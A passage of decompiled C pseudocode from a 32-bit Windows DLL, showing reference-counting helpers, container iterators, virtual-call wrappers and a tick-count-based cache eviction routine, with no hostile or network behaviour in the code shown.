  (*(void (__thiscall **)(_DWORD *, int, int, int, int))(*this[1] + 20))(this[1], v30, v31, v32, v33);
  (*(void (__thiscall **)(_DWORD *, int *))(*this[1] + 24))(this[1], v38);
  LOBYTE(v43) = 12;
  v42 = 0;
  while ( v38[0] )
  {
    v10 = this[1];
    v11 = *v10;
    v42 = (void ***)((char *)v42 + 1);
    v12 = (_DWORD *)(*(int (__thiscall **)(int *, char *))(v11 + 24))(v10, v39);
    LOBYTE(v43) = 13;
    sub_100097B7(v38, v12);
    LOBYTE(v43) = 12;
    sub_1000977E(v39);
  }
  sub_1001CD27(v35, (char)v42);
  (*(void (__thiscall **)(_DWORD *))(*this[1] + 20))(this[1]);
  v13 = (_DWORD *)(*(int (__thiscall **)(_DWORD *, char *))(*this[1] + 24))(this[1], v39);
  LOBYTE(v43) = 14;
  sub_100097B7(v38, v13);
  LOBYTE(v43) = 12;
  for ( i = v39; ; i = v36 )
  {
    sub_1000977E(i);
    if ( !v38[0] )
      break;
    v15 = (*(int (__thiscall **)(int))(*(_DWORD *)v38[0] + 4))(v38[0]);
    sub_1001CD27(v35, v15);
    v16 = *(_DWORD *)v38[0];
    v40 = (void ***)&v29;
    v28 = v38[0];
    v27 = (void **)v38[0];
    v42 = &v27;
    v26 = (void **)&v27;
    (*(void (**)(void))(v16 + 8))();
    LOBYTE(v43) = 12;
    sub_10009121((int)&v29, (int)v26, v27);
    LOBYTE(v43) = 12;
    sub_1001CDCD(v35, v28, v29, v30, v31, v32);
    v17 = *(_DWORD *)v38[0];
    v40 = (void ***)&v28;
    v27 = (void **)v38[0];
    v26 = (void **)v38[0];
    v42 = &v26;
    v25 = (void **)&v26;
    (*(void (**)(void))(v17 + 12))();
    LOBYTE(v43) = 12;
    sub_10009121((int)&v28, (int)v25, v26);
    LOBYTE(v43) = 12;
    sub_1001CDCD(v35, (int)v27, v28, v29, v30, v31);
    v18 = *(_DWORD *)v38[0];
    v40 = &v27;
    v26 = (void **)v38[0];
    v25 = (void **)v38[0];
    v42 = &v25;
    v24 = (void **)&v25;
    (*(void (**)(void))(v18 + 16))();
    LOBYTE(v43) = 12;
    sub_10009121((int)&v27, (int)v24, v25);
    LOBYTE(v43) = 12;
    sub_1001CDCD(v35, (int)v26, (int)v27, v28, v29, v30);
    v19 = *(_DWORD *)v38[0];
    v40 = &v26;
    v25 = (void **)v38[0];
    v24 = (void **)v38[0];
    v42 = &v24;
    v23 = (void **)&v24;
    (*(void (**)(void))(v19 + 20))();
    LOBYTE(v43) = 12;
    sub_10009121((int)&v26, (int)v23, v24);
    LOBYTE(v43) = 12;
    sub_1001CDCD(v35, (int)v25, (int)v26, (int)v27, v28, v29);
    v20 = *(_DWORD *)v38[0];
    v40 = &v25;
    v24 = (void **)v38[0];
    v23 = (void **)v38[0];
    v42 = &v23;
    (*(void (**)(void))(v20 + 24))();
    LOBYTE(v43) = 12;
    sub_10009121((int)&v25, (int)&v23, v23);
    LOBYTE(v43) = 12;
    sub_1001CDCD(v35, (int)v24, (int)v25, (int)v26, (int)v27, v28);
    v21 = (_DWORD *)(*(int (__thiscall **)(_DWORD *, char *, int, int, int, int, int))(*this[1] + 24))(
                      this[1],
                      v36,
                      v29,
                      v30,
                      v31,
                      v32,
                      v33);
    LOBYTE(v43) = 25;
    sub_100097B7(v38, v21);
    LOBYTE(v43) = 12;
  }
  sub_10017EAF(v34, a2);
  v41 = 1;
  LOBYTE(v43) = 3;
  sub_1000977E(v38);
  LOBYTE(v43) = 2;
  sub_10009742(v37);
  LOBYTE(v43) = 1;
  sub_1001CC9A(v35);
  LOBYTE(v43) = 0;
  sub_10017DC3((int)v34);
  return a2;
}
// 1000917E: using guessed type int var_68[9];
// 1000917E: using guessed type _DWORD var_44[4];
// 1000917E: using guessed type char var_1C[4];

//----- (100094DC) --------------------------------------------------------
char __thiscall sub_100094DC(_DWORD **this)
{
  int v1; // eax
  unsigned int v2; // ebx
  wchar_t **v3; // eax
  wchar_t *v4; // eax
  char *v5; // edi
  char v6; // bl
  _DWORD v8[2]; // [esp+Ch] [ebp-1Ch] BYREF
  int v9[2]; // [esp+14h] [ebp-14h] BYREF
  int v10; // [esp+24h] [ebp-4h]

  v1 = (*(int (__thiscall **)(_DWORD *, _DWORD *))(*this[1] + 4))(this[1], v8);
  v2 = 0;
  v10 = 0;
  v3 = *(wchar_t ***)(v1 + 4);
  if ( v3 )
    v4 = *v3;
  else
    v4 = 0;
  sub_10012A00(v9, v4);
  LOBYTE(v10) = 2;
  sub_10008F07(v8);
  v5 = (char *)&unk_100BF630;
  while ( sub_1000D8AA((int)v5, (int)v9, 0) == -1 )
  {
    v2 += 8;
    v5 += 8;
    if ( v2 >= 0x48 )
    {
      v6 = 0;
      goto LABEL_9;
    }
  }
  v6 = 1;
LABEL_9:
  v10 = -1;
  sub_10012AAC(v9);
  return v6;
}
// 100094DC: using guessed type _DWORD var_1C[2];

//----- (10009564) --------------------------------------------------------
int __thiscall sub_10009564(_DWORD *this, int a2)
{
  void **v3; // ecx
  void (__stdcall **v4)(void ****); // eax
  void **v5; // ecx
  void (**v6)(void); // eax
  void **v7; // ecx
  void (**v8)(void); // eax
  void **v9; // ecx
  void (**v10)(void); // eax
  void ***v12; // [esp-1Ch] [ebp-74h] BYREF
  void **v13; // [esp-18h] [ebp-70h] BYREF
  void **v14; // [esp-14h] [ebp-6Ch] BYREF
  void **v15; // [esp-10h] [ebp-68h] BYREF
  void **v16; // [esp-Ch] [ebp-64h] BYREF
  int v17; // [esp-8h] [ebp-60h] BYREF
  int v18; // [esp-4h] [ebp-5Ch]
  int v19; // [esp+0h] [ebp-58h]
  int v20; // [esp+4h] [ebp-54h]
  int v21; // [esp+8h] [ebp-50h]
  int v22[9]; // [esp+Ch] [ebp-4Ch] BYREF
  _DWORD v23[4]; // [esp+30h] [ebp-28h] BYREF
  void ***v24; // [esp+40h] [ebp-18h]
  void ***v25; // [esp+44h] [ebp-14h]
  int v26; // [esp+48h] [ebp-10h]
  int v27; // [esp+54h] [ebp-4h]

  v26 = 0;
  sub_10017D60(v22);
  v27 = 1;
  sub_1001CC48(v23, (int)v22, 1);
  LOBYTE(v27) = 2;
  v3 = (void **)this[1];
  v4 = (void (__stdcall **)(void ****))*v3;
  v25 = &v14;
  v13 = v3;
  v12 = (void ***)v3;
  v24 = (void ***)&v12;
  v4[1](&v12);
  LOBYTE(v27) = 2;
  sub_10009121((int)&v14, (int)v15, v16);
  LOBYTE(v27) = 2;
  sub_1001CDCD(v23, v17, v18, v19, v20, v21);
  v5 = (void **)this[1];
  v6 = (void (**)(void))*v5;
  v24 = (void ***)&v17;
  v16 = v5;
  v15 = v5;
  v25 = &v15;
  v14 = (void **)&v15;
  v6[2]();
  LOBYTE(v27) = 2;
  sub_10009121((int)&v17, (int)v14, v15);
  LOBYTE(v27) = 2;
  sub_1001CDCD(v23, (int)v16, v17, v18, v19, v20);
  v7 = (void **)this[1];
  v8 = (void (**)(void))*v7;
  v24 = &v16;
  v15 = v7;
  v14 = v7;
  v25 = &v14;
  v13 = (void **)&v14;
  v8[3]();
  LOBYTE(v27) = 2;
  sub_10009121((int)&v16, (int)v13, v14);
  LOBYTE(v27) = 2;
  sub_1001CDCD(v23, (int)v15, (int)v16, v17, v18, v19);
  v9 = (void **)this[1];
  v10 = (void (**)(void))*v9;
  v24 = &v15;
  v14 = v9;
  v13 = v9;
  v25 = &v13;
  v12 = &v13;
  v10[4]();
  LOBYTE(v27) = 2;
  sub_10009121((int)&v15, (int)v12, v13);
  LOBYTE(v27) = 2;
  sub_1001CDCD(v23, (int)v14, (int)v15, (int)v16, v17, v18);
  sub_10017EAF(v22, a2);
  v26 = 1;
  LOBYTE(v27) = 1;
  sub_1001CC9A(v23);
  LOBYTE(v27) = 0;
  sub_10017DC3((int)v22);
  return a2;
}
// 10009564: using guessed type int var_4C[9];
// 10009564: using guessed type _DWORD var_28[4];

//----- (100096B8) --------------------------------------------------------
char sub_100096B8()
{
  return 1;
}

//----- (100096BB) --------------------------------------------------------
int __thiscall sub_100096BB(_DWORD *this, int a2)
{
  int v4[9]; // [esp+8h] [ebp-44h] BYREF
  _DWORD v5[4]; // [esp+2Ch] [ebp-20h] BYREF
  int v6; // [esp+3Ch] [ebp-10h]
  int v7; // [esp+48h] [ebp-4h]

  v6 = 0;
  sub_10017D60(v4);
  v7 = 1;
  sub_1001CC48(v5, (int)v4, 1);
  LOBYTE(v7) = 2;
  sub_1001CD27(v5, this[1]);
  sub_1001CD27(v5, this[2]);
  sub_10017EAF(v4, a2);
  v6 = 1;
  LOBYTE(v7) = 1;
  sub_1001CC9A(v5);
  LOBYTE(v7) = 0;
  sub_10017DC3((int)v4);
  return a2;
}
// 100096BB: using guessed type int var_44[9];
// 100096BB: using guessed type _DWORD var_20[4];

//----- (10009742) --------------------------------------------------------
void __thiscall sub_10009742(void *this)
{
  _DWORD v1[7]; // [esp+0h] [ebp-1Ch] BYREF

  v1[3] = v1;
  v1[6] = 0;
  sub_100097E7((int)this);
}

//----- (1000977E) --------------------------------------------------------
void __thiscall sub_1000977E(void *this)
{
  _DWORD v1[7]; // [esp+0h] [ebp-1Ch] BYREF

  v1[3] = v1;
  v1[6] = 0;
  sub_10009821((int)this);
}

//----- (100097B7) --------------------------------------------------------
_DWORD *__usercall sub_100097B7@<eax>(_DWORD *a1@<eax>, _DWORD *a2@<edi>)
{
  volatile LONG *v4; // [esp-4h] [ebp-8h]

  if ( *a1 != *a2 )
  {
    sub_10009821((int)a1);
    a1[1] = a2[1];
    v4 = (volatile LONG *)a1[1];
    *a1 = *a2;
    InterlockedIncrement(v4);
  }
  return a1;
}

//----- (100097E7) --------------------------------------------------------
void __usercall sub_100097E7(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (10009821) --------------------------------------------------------
void __usercall sub_10009821(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (10009853) --------------------------------------------------------
char __thiscall sub_10009853(_DWORD *this, char a2)
{
  bool v3; // zf
  int v4; // eax
  DWORD *v5; // esi
  unsigned int v7; // ebx
  int (__thiscall **v8)(_DWORD *, int); // edi
  int v9; // eax
  int (__thiscall **v10)(_DWORD *, int); // edi
  int v11; // eax
  DWORD *v12; // esi
  unsigned int v13; // [esp+1Ch] [ebp-28h]
  int v14; // [esp+20h] [ebp-24h] BYREF
  int v15; // [esp+24h] [ebp-20h] BYREF
  unsigned int v16; // [esp+28h] [ebp-1Ch]
  int v17; // [esp+40h] [ebp-4h]

  v3 = (*(unsigned __int8 (__thiscall **)(_DWORD *, char *))(*this + 8))(this, &a2) == 0;
  v4 = *this;
  if ( v3 )
  {
    if ( (unsigned int)(*(int (__thiscall **)(_DWORD *))(v4 + 4))(this) > this[9] )
    {
      (*(void (__thiscall **)(_DWORD *, int *))(*this + 44))(this, &v15);
      v17 = 0;
      v7 = -1;
      v14 = 0;
      v13 = 0;
      if ( v16 )
      {
        do
        {
          v8 = (int (__thiscall **)(_DWORD *, int))(*this + 16);
          v9 = (*(int (__thiscall **)(int *, unsigned int))(v15 + 44))(&v15, v13);
          if ( *(_DWORD *)(*v8)(this, v9) < v7 )
          {
            v10 = (int (__thiscall **)(_DWORD *, int))(*this + 16);
            v11 = (*(int (__thiscall **)(int *, unsigned int))(v15 + 44))(&v15, v13);
            v7 = *(_DWORD *)(*v10)(this, v11);
            v14 = *(_DWORD *)(*(int (__thiscall **)(int *, unsigned int))(v15 + 44))(&v15, v13);
          }
          ++v13;
        }
        while ( v13 < v16 );
        if ( v7 != -1 )
          (*(void (__thiscall **)(_DWORD *, int *))(*this + 12))(this, &v14);
      }
      v17 = -1;
      sub_10007890((int)&v15);
    }
    v12 = (DWORD *)(*(int (__thiscall **)(_DWORD *, char *))(*this + 16))(this, &a2);
    *v12 = GetTickCount();
    return 0;
  }
  else
  {
    v5 = (DWORD *)(*(int (__thiscall **)(_DWORD *, char *))(v4 + 16))(this, &a2);
    *v5 = GetTickCount();
    return 1;
  }
}

//----- (1000999B) --------------------------------------------------------
int __stdcall sub_1000999B(int a1, char a2)
{
  sub_1000AAD3((_DWORD *)a1, 0);
  *(_BYTE *)(a1 + 8) = a2;
  return a1;
}

//----- (100099CF) --------------------------------------------------------
int __stdcall sub_100099CF(int a1, char a2)
{
  sub_1000ABCD((_DWORD *)a1);
  *(_BYTE *)(a1 + 8) = a2;
  return a1;
}

//----- (10009A01) --------------------------------------------------------
int __stdcall sub_10009A01(int a1)
{
  sub_10016983(0, a1, 0);
  return a1;
}

//----- (10009A39) --------------------------------------------------------
_DWORD *__stdcall sub_10009A39(_DWORD *a1, int a2, int a3)
{
  *a1 = &off_1009341C;
  sub_1000AC5A(a1 + 1, 0);
  sub_1000ACD7(a1 + 1, &a2);
  sub_1000AC9E(&a2);
  return a1;
}
// 1009341C: using guessed type int (*off_1009341C)();

//----- (10009A89) --------------------------------------------------------
int sub_10009A89()
{
  return 0;
}

//----- (10009A93) --------------------------------------------------------
_DWORD *__stdcall sub_10009A93(_DWORD *a1, int a2, int a3)
{
  *a1 = &off_1009342C;
  sub_1000AB64(a1 + 1, 0);
  sub_1000ABA8(a1 + 1, &a2);
  sub_10009742(&a2);
  return a1;
}
// 1009342C: using guessed type int (*off_1009342C)();

//----- (10009AE3) --------------------------------------------------------
int sub_10009AE3()
{
  return 1;
}

//----- (10009AFA) --------------------------------------------------------
int sub_10009AFA()
{
  return 2;
}

//----- (10009AFE) --------------------------------------------------------
_DWORD *__stdcall sub_10009AFE(_DWORD *a1, int a2, int a3, int a4, int a5)
{
  *a1 = &off_100933E4;
  a1[1] = a2;
  *a1 = &off_1009344C;
  sub_100141F3(a1 + 2, (int)&a3);
  sub_100141CF(&a3);
  return a1;
}
// 100933E4: using guessed type int (__thiscall *off_100933E4)(void *Block, char);
// 1009344C: using guessed type int (__thiscall *off_1009344C)(void *Block, char);

//----- (10009B50) --------------------------------------------------------
_DWORD *__thiscall sub_10009B50(_DWORD *Block, char a2)
{
  sub_10009B74(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10009B74) --------------------------------------------------------
LONG __stdcall sub_10009B74(_DWORD *a1)
{
  LONG result; // eax

  result = sub_100141CF(a1 + 2);
  *a1 = &off_100933E4;
  return result;
}
// 100933E4: using guessed type int (__thiscall *off_100933E4)(void *Block, char);

//----- (10009BA7) --------------------------------------------------------
void __thiscall sub_10009BA7(int **this, unsigned __int8 (__thiscall ***a2)(_DWORD), volatile LONG *lpAddend)
{
  _DWORD *v4; // eax
  unsigned __int8 (__thiscall ***v5)(_DWORD); // [esp-8h] [ebp-30h] BYREF
  volatile LONG *v6; // [esp-4h] [ebp-2Ch]
  unsigned __int8 (__thiscall ***v7)(_DWORD); // [esp+Ch] [ebp-1Ch] BYREF
  volatile LONG *v8; // [esp+10h] [ebp-18h]
  unsigned __int8 (__thiscall ****v9)(_DWORD); // [esp+14h] [ebp-14h]
  void *Block; // [esp+18h] [ebp-10h]
  int v11; // [esp+24h] [ebp-4h]

  v11 = 0;
  sub_1000AD10(&v7);
  LOBYTE(v11) = 1;
  Block = operator new(0xCu);
  LOBYTE(v11) = 2;
  if ( Block )
  {
    v9 = &v5;
    v6 = lpAddend;
    v5 = a2;
    InterlockedIncrement(lpAddend);
    LOBYTE(v11) = 2;
    v4 = sub_10009A39(Block, (int)v5, (int)v6);
  }
  else
  {
    v4 = 0;
  }
  LOBYTE(v11) = 1;
  sub_1000AFE0((int)&v7, (int)v4);
  v9 = &v5;
  v6 = v8;
  v5 = v7;
  InterlockedIncrement(v8);
  LOBYTE(v11) = 1;
  sub_1000C261(this[1], v5, (int)v6);
  LOBYTE(v11) = 0;
  sub_1000AD50((void **)&v7);
  v11 = -1;
  sub_1000AC9E(&a2);
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (10009C67) --------------------------------------------------------
void __thiscall sub_10009C67(int **this, unsigned __int8 (__thiscall ***a2)(_DWORD), volatile LONG *lpAddend)
{
  _DWORD *v4; // eax
  unsigned __int8 (__thiscall ***v5)(_DWORD); // [esp-8h] [ebp-30h] BYREF
  volatile LONG *v6; // [esp-4h] [ebp-2Ch]
  unsigned __int8 (__thiscall ***v7)(_DWORD); // [esp+Ch] [ebp-1Ch] BYREF
  volatile LONG *v8; // [esp+10h] [ebp-18h]
  unsigned __int8 (__thiscall ****v9)(_DWORD); // [esp+14h] [ebp-14h]
  void *Block; // [esp+18h] [ebp-10h]
  int v11; // [esp+24h] [ebp-4h]

  v11 = 0;
  sub_1000AD10(&v7);
  LOBYTE(v11) = 1;
  Block = operator new(0xCu);
  LOBYTE(v11) = 2;
  if ( Block )
  {
    v9 = &v5;
    v6 = lpAddend;
    v5 = a2;
    InterlockedIncrement(lpAddend);
    LOBYTE(v11) = 2;
    v4 = sub_10009A93(Block, (int)v5, (int)v6);
  }
  else
  {
    v4 = 0;
  }
  LOBYTE(v11) = 1;
  sub_1000AFE0((int)&v7, (int)v4);
  v9 = &v5;
  v6 = v8;
  v5 = v7;
  InterlockedIncrement(v8);
  LOBYTE(v11) = 1;
  sub_1000C261(this[1], v5, (int)v6);
  LOBYTE(v11) = 0;
  sub_1000AD50((void **)&v7);
  v11 = -1;
  sub_10009742(&a2);
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (10009D27) --------------------------------------------------------
char sub_10009D27()
{
  return 1;
}

//----- (10009D2A) --------------------------------------------------------
void __thiscall sub_10009D2A(int **this, int a2, int a3)
{
  _DWORD *v4; // eax
  unsigned __int8 (__thiscall ***v5)(_DWORD); // [esp-8h] [ebp-30h] BYREF
  volatile LONG *v6; // [esp-4h] [ebp-2Ch]
  void *Block; // [esp+Ch] [ebp-1Ch]
  unsigned __int8 (__thiscall ***v8)(_DWORD); // [esp+10h] [ebp-18h] BYREF
  volatile LONG *lpAddend; // [esp+14h] [ebp-14h]
  int v10; // [esp+24h] [ebp-4h]

  sub_1000AD10(&v8);
  v10 = 0;
  v4 = operator new(0xCu);
  Block = v4;
  LOBYTE(v10) = 1;
  if ( v4 )
  {
    v4[1] = a2;
    *v4 = &off_1009343C;
    v4[2] = a3;
  }
  else
  {
    v4 = 0;
  }
  LOBYTE(v10) = 0;
  sub_1000AFE0((int)&v8, (int)v4);
  Block = &v5;
  v6 = lpAddend;
  v5 = v8;
  InterlockedIncrement(lpAddend);
  LOBYTE(v10) = 0;
  sub_1000C261(this[1], v5, (int)v6);
  v10 = -1;
  sub_1000AD50((void **)&v8);
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);
// 1009343C: using guessed type int (*off_1009343C)();

//----- (10009DE6) --------------------------------------------------------
int __stdcall sub_10009DE6(char *a1)
{
  int v1; // esi
  int v2; // eax
  _DWORD *v3; // eax
  bool v4; // bl
  int v5; // esi
  int v7[2]; // [esp+8h] [ebp-38h] BYREF
  int v8[2]; // [esp+10h] [ebp-30h] BYREF
  int v9[2]; // [esp+18h] [ebp-28h] BYREF
  int v10[3]; // [esp+20h] [ebp-20h] BYREF
  unsigned int v11; // [esp+2Ch] [ebp-14h]
  int v12; // [esp+3Ch] [ebp-4h]

  sub_1000CEE8(v8, a1);
  v12 = 0;
  sub_10012A7C(v7, (int)v8);
  LOBYTE(v12) = 1;
  sub_1001D82E(v10);
  LOBYTE(v12) = 2;
  v1 = 0;
  if ( v11 )
  {
    while ( 1 )
    {
      v2 = (*(int (__thiscall **)(int *, int))(v10[0] + 44))(v10, v1);
      v3 = sub_1001D7F9(v2, v9);
      LOBYTE(v12) = 3;
      v4 = sub_1000D84E((int)v3, (int)v7);
      LOBYTE(v12) = 2;
      sub_1000CE59(v9);
      if ( v4 )
        break;
      if ( ++v1 >= v11 )
        goto LABEL_4;
    }
    v5 = *(_DWORD *)(*(int (__thiscall **)(int *, int))(v10[0] + 44))(v10, v1);
  }
  else
  {
LABEL_4:
    v5 = 0;
  }
  LOBYTE(v12) = 1;
  sub_10009F6C(v10);
  LOBYTE(v12) = 0;
  sub_10012AAC(v7);
  v12 = -1;
  sub_1000CE59(v8);
  return v5;
}

//----- (10009ED7) --------------------------------------------------------
_DWORD *__stdcall sub_10009ED7(_DWORD *a1)
{
  sub_1000CC20(a1, a5);
  return a1;
}
// 100B840C: using guessed type wchar_t a5[2];

//----- (10009F0F) --------------------------------------------------------
_DWORD *__stdcall sub_10009F0F(_DWORD *a1)
{
  sub_1000CC20(a1, a8);
  return a1;
}
// 100B8494: using guessed type wchar_t a8[2];

//----- (10009F47) --------------------------------------------------------
_DWORD *__stdcall sub_10009F47(_DWORD *a1)
{
  _DWORD *result; // eax

  result = a1;
  *a1 = dword_10092E9C[0];
  a1[1] = dword_10092E9C[1];
  a1[2] = dword_10092E9C[2];
  a1[3] = dword_10092E9C[3];
  return result;
}
// 10092E9C: using guessed type _DWORD dword_10092E9C[5];

//----- (10009F5D) --------------------------------------------------------
BOOL __thiscall sub_10009F5D(void *this)
{
  return !sub_10014F97((int)this + 8);
}

//----- (10009F6C) --------------------------------------------------------
void *__thiscall sub_10009F6C(_DWORD *this)
{
  _DWORD *i; // esi
  _DWORD *v3; // ebx
  _DWORD v5[5]; // [esp+0h] [ebp-20h] BYREF
  int v6; // [esp+1Ch] [ebp-4h]

  v5[4] = v5;
  v5[3] = this;
  *this = &off_10093478;
  v6 = 1;
  for ( i = (_DWORD *)this[1]; i; i = v3 )
  {
    v3 = (_DWORD *)i[4];
    sub_1000A43F(i);
  }
  v6 = -1;
  return sub_1000A179(this);
}
// 10093478: using guessed type int (__thiscall *off_10093478)(void *Block, char);

//----- (10009FD1) --------------------------------------------------------
void *__thiscall sub_10009FD1(void *this, int a2)
{
  sub_1000A4F0(a2, (int)this);
  return this;
}

//----- (10009FE3) --------------------------------------------------------
void *__thiscall sub_10009FE3(void *this, int a2)
{
  sub_1000A4F0(a2, (int)this);
  return this;
}

//----- (10009FF5) --------------------------------------------------------
int __thiscall sub_10009FF5(_DWORD *this)
{
  return this[3];
}

//----- (10009FF9) --------------------------------------------------------
_DWORD *__thiscall sub_10009FF9(int *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  _DWORD *v4; // eax

  v3 = operator new(0x10u);
  if ( v3 )
    v4 = sub_1000A5CB(this, v3, this[1], 0);
  else
    v4 = 0;
  sub_1000ADAD(a2, (int)v4);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1000A059) --------------------------------------------------------
_DWORD *__thiscall sub_1000A059(int *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  _DWORD *v4; // eax

  v3 = operator new(0x10u);
  if ( v3 )
    v4 = sub_1000A7CF(this, v3, this[1], 0);
  else
    v4 = 0;
  sub_1000AE44(a2, (int)v4);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1000A0B9) --------------------------------------------------------
_DWORD *__thiscall sub_1000A0B9(int *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  _DWORD *v4; // eax

  v3 = operator new(0x10u);
  if ( v3 )
    v4 = sub_1000A5CB(this, v3, 0, this[2]);
  else
    v4 = 0;
  sub_1000ADAD(a2, (int)v4);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1000A119) --------------------------------------------------------
_DWORD *__thiscall sub_1000A119(int *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  _DWORD *v4; // eax

  v3 = operator new(0x10u);
  if ( v3 )
    v4 = sub_1000A7CF(this, v3, 0, this[2]);
  else
    v4 = 0;
  sub_1000AE44(a2, (int)v4);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1000A179) --------------------------------------------------------
void *__thiscall sub_1000A179(_DWORD *this)
{
  void *result; // eax

  result = &loc_1007845A;
  *this = &off_100934B8;
  *this = off_10092F20;
  return result;
}
// 10092F20: using guessed type int (__thiscall *off_10092F20[2])(void *Block, char);
// 100934B8: using guessed type int (__thiscall *off_100934B8)(void *Block, char);

//----- (1000A1A3) --------------------------------------------------------
int *__thiscall sub_1000A1A3(void *this, int *a2, unsigned int pExceptionObject)
{
  unsigned int v4; // eax
  int v5; // ecx
  unsigned int v6; // ebx

  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject > v4 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 12))(this, a2);
  if ( pExceptionObject )
  {
    v6 = pExceptionObject;
    do
    {
      sub_1000A55A(v5, *a2);
      --v6;
    }
    while ( v6 );
  }
  return a2;
}
// 1000A1FB: variable 'v5' is possibly undefined

//----- (1000A216) --------------------------------------------------------
int *__thiscall sub_1000A216(void *this, int *a2, unsigned int pExceptionObject)
{
  unsigned int v4; // eax
  int v5; // ecx
  unsigned int v6; // ebx

  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject > v4 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 8))(this, a2);
  if ( pExceptionObject )
  {
    v6 = pExceptionObject;
    do
    {
      sub_1000A59A(v5, *a2);
      --v6;
    }
    while ( v6 );
  }
  return a2;
}
// 1000A26E: variable 'v5' is possibly undefined

//----- (1000A289) --------------------------------------------------------
void __thiscall sub_1000A289(void *this, int a2)
{
  int v2[2]; // [esp+0h] [ebp-14h] BYREF
  int v3; // [esp+10h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 20))(this, v2);
  v3 = 0;
  (*(void (__thiscall **)(int, int))(*(_DWORD *)v2[0] + 28))(v2[0], a2);
  v3 = -1;
  sub_1000ADF1(v2);
}

//----- (1000A2C7) --------------------------------------------------------
void __thiscall sub_1000A2C7(void *this, int a2, int a3)
{
  int v3[2]; // [esp+0h] [ebp-14h] BYREF
  int v4; // [esp+10h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 28))(this, v3, a3);
  v4 = 0;
  (*(void (__thiscall **)(int, int))(*(_DWORD *)v3[0] + 28))(v3[0], a2);
  v4 = -1;
  sub_1000ADF1(v3);
}

//----- (1000A308) --------------------------------------------------------
void __thiscall sub_1000A308(void *this, int a2)
{
  int v2[2]; // [esp+0h] [ebp-14h] BYREF
  int v3; // [esp+10h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 28))(this, v2, a2);
  v3 = 0;
  (*(void (__thiscall **)(int))(*(_DWORD *)v2[0] + 24))(v2[0]);
  v3 = -1;
  sub_1000ADF1(v2);
}

//----- (1000A346) --------------------------------------------------------
int __thiscall sub_1000A346(void *this, int a2)
{
  int v2; // esi
  int v4[2]; // [esp+4h] [ebp-14h] BYREF
  int v5; // [esp+14h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 24))(this, v4, a2);
  v5 = 0;
  v2 = (*(int (__thiscall **)(int))(*(_DWORD *)v4[0] + 12))(v4[0]);
  v5 = -1;
  sub_1000AE88(v4);
  return v2;
}

//----- (1000A38A) --------------------------------------------------------
int __thiscall sub_1000A38A(void *this, int a2)
{
  int v2; // esi
  int v4[2]; // [esp+4h] [ebp-14h] BYREF
  int v5; // [esp+14h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 28))(this, v4, a2);
  v5 = 0;
  v2 = (*(int (__thiscall **)(int))(*(_DWORD *)v4[0] + 12))(v4[0]);
  v5 = -1;
  sub_1000ADF1(v4);
  return v2;
}

//----- (1000A3CE) --------------------------------------------------------
void __thiscall sub_1000A3CE(void *this)
{
  int v1[2]; // [esp+0h] [ebp-14h] BYREF
  int v2; // [esp+10h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 12))(this, v1);
  v2 = 0;
  while ( !(*(unsigned __int8 (__thiscall **)(int))(*(_DWORD *)v1[0] + 4))(v1[0]) )
    (*(void (__thiscall **)(int))(*(_DWORD *)v1[0] + 24))(v1[0]);
  v2 = -1;
  sub_1000ADF1(v1);
}

//----- (1000A423) --------------------------------------------------------
_DWORD *__thiscall sub_1000A423(_DWORD *Block, char a2)
{
  sub_10009F6C(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1000A43F) --------------------------------------------------------
void *__usercall sub_1000A43F@<eax>(void *a1@<esi>)
{
  int v2; // [esp+0h] [ebp-4h]

  sub_1000A4A5(v2);
  j__free(a1);
  return a1;
}
// 1000A440: variable 'v2' is possibly undefined

//----- (1000A44F) --------------------------------------------------------
_DWORD *__thiscall sub_1000A44F(_DWORD *Block, char a2)
{
  sub_1000A179(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1000A4A5) --------------------------------------------------------
LONG __stdcall sub_1000A4A5(int a1)
{
  return sub_1000A4C9(a1);
}

//----- (1000A4C9) --------------------------------------------------------
